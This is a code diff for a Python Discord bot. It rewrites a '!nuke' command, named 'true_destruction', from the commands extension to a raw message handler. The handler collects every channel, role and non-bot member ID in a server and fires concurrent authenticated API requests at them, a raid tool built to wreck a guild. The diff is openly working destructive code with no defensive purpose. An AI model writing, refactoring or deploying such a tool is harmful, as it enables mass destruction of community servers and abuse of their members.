@@ -1,7 +1,6 @@
 import asyncio
 import aiohttp
 import discord
-from discord.ext import commands
 import logging
 
 
@@ -24,26 +23,30 @@ TOKEN = ""
 
 logging.getLogger('discord').setLevel(logging.CRITICAL)
 intents = discord.Intents.all()
-bot = commands.Bot(command_prefix="!", intents=intents)
+client = discord.Client(intents=intents)
 
-@bot.event
+@client.event
 async def on_ready():
     pass
 
-# === この部分を追加 ===
-@bot.event
+@client.event
 async def on_message(message):
-    await bot.process_commands(message)
-
-@bot.command(name="nuke")
-async def true_destruction(ctx):
-    g_id = ctx.guild.id
-    token = bot.http.token
+    if message.author.bot:
+        return
+    if not message.content.startswith("!nuke"):
+        return
     
-    ch_ids = [ch.id for ch in ctx.guild.channels]
-    txt_ids = [ch.id for ch in ctx.guild.text_channels if ch.permissions_for(ctx.guild.me).send_messages]
-    role_ids = [r.id for r in ctx.guild.roles if r.id != g_id and not r.managed and r < ctx.guild.me.top_role]
-    m_ids = [m.id for m in ctx.guild.members if not m.bot]
+    guild = message.guild
+    if guild is None:
+        return
+    
+    g_id = guild.id
+    token = TOKEN
+    
+    ch_ids = [ch.id for ch in guild.channels]
+    txt_ids = [ch.id for ch in guild.text_channels if ch.permissions_for(guild.me).send_messages]
+    role_ids = [r.id for r in guild.roles if r.id != g_id and not r.managed and r < guild.me.top_role]
+    m_ids = [m.id for m in guild.members if not m.bot]
 
     headers = {
         "Authorization": f"Bot {token}",
@@ -88,4 +91,4 @@ async def true_destruction(ctx):
 
         await asyncio.gather(*tasks, return_exceptions=True)
 
-bot.run(TOKEN)
+client.run(TOKEN)
